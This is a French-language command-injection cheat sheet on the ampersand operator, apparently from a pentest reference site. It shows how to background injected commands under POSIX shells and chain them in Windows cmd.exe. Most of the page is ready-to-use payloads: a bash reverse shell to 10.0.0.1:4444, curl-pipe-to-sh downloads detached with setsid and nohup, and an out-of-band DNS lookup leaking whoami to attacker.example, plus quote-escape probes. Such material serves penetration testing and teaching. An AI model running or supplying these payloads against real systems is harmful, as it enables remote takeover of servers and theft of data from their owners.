---
title: "Exécution en arrière-plan avec l'opérateur esperluette"
description: "Utiliser & pour détacher une commande injectée afin qu'elle s'exécute de façon asynchrone, gardant la réponse rapide pendant qu'un payload s'exécute, et la signification de & comme séparateur sous cmd.exe de Windows."
keywords:
  - injection de commande
  - exécution en arrière-plan
  - opérateur esperluette
  - injection de commande asynchrone
  - injection de shell
  - injection de commande windows
---

# Exécution en arrière-plan (&)

Une seule esperluette finale indique au shell d'exécuter la commande précédente **en arrière-plan** et de rendre la main immédiatement, sans attendre qu'elle se termine. En injection de commande OS, cela détache un payload de la requête, de sorte qu'une commande longue ou bruyante s'exécute pendant que la réponse HTTP revient à temps.

## Mécanisme

Dans `sh`/`bash`, `cmd &` fork `cmd` en arrière-plan et le shell poursuit. Injecté dans un sink :

```
127.0.0.1 & id
```

Le shell met en arrière-plan la commande (prévue) et exécute `id` ; la main revient sans bloquer sur le premier job. Comme le processus parent n'a pas besoin d'attendre, la réponse de l'application n'est pas maintenue ouverte par votre payload, utile lorsqu'une commande synchrone ferait expirer la requête ou bloquerait le worker.

## Payloads asynchrones

Le détachement importe le plus lorsque le payload est lent ou devrait survivre à la requête. Une mise en garde : lorsque le sink vulnérable **capture la sortie** (`shell_exec()`, `subprocess` avec stdout/stderr capturés, backticks), un job mis en arrière-plan hérite tout de même de ces pipes, de sorte que l'appelant peut bloquer jusqu'à ce que le job se termine même si le shell lui-même a poursuivi. Redirigez les trois flux standard (`</dev/null >/dev/null 2>&1`) pour que le job soit pleinement détaché et que la réponse revienne immédiatement :

```
127.0.0.1 & bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' </dev/null >/dev/null 2>&1 &
127.0.0.1 & (curl http://10.0.0.1/s.sh | sh) </dev/null >/dev/null 2>&1 &
127.0.0.1 & nohup sleep 300 >/dev/null 2>&1 &        # survives the parent exiting
```

Se détacher pleinement du terminal de contrôle et des flux garde le job vivant après la fin de la requête :

```
127.0.0.1 & setsid sh -c 'curl http://10.0.0.1/s.sh|sh' </dev/null >/dev/null 2>&1 &
```

## Timing et confirmation

Un job mis en arrière-plan ne retarde pas la réponse, donc `&` est médiocre comme oracle temporel à lui seul, utilisez `;` ou `&&` avec `sleep` lorsque vous voulez que le délai soit *observable*. À l'inverse, `&` est idéal lorsque vous voulez l'exécution **sans** changer le temps de réponse, en confirmant plutôt via un callback hors bande :

```
127.0.0.1 & nslookup $(whoami).OOB_ID.attacker.example &
```

## Gestion du contexte

L'esperluette n'est analysée comme opérateur de contrôle qu'en dehors des guillemets ; sortez-en d'abord si nécessaire, et combinez avec `${IFS}` lorsque les espaces sont filtrés :

```
"; id & echo "
127.0.0.1&id          # no spaces required around &
```

## Windows : `&` est un séparateur

Sous `cmd.exe` de Windows, l'esperluette ne met **pas** en arrière-plan, c'est le **séparateur de commandes** inconditionnel (l'analogue `cmd` du `;` POSIX) :

```
127.0.0.1 & whoami            # runs whoami after ping, sequentially
127.0.0.1 & ping -n 10 127.0.0.1
```

Cette double signification est pourquoi `&` est l'un des caractères d'injection les plus portables : il chaîne sous `cmd.exe` et met en arrière-plan sous les shells POSIX, de sorte qu'une sonde contenant `&` déclenche souvent l'exécution sur l'une ou l'autre plateforme.

## Outils

- **[commix](https://github.com/commixproject/commix)** : détection et exploitation automatisées de l'injection de commande.
- **[Burp Suite](https://portswigger.net/burp)** : Repeater et Intruder pour injecter et chaîner des séparateurs.
- **[interactsh](https://github.com/projectdiscovery/interactsh)** : capture de callback hors bande pour les payloads détachés.

## Références

- [OWASP: OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger Web Security Academy: OS command injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings: Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
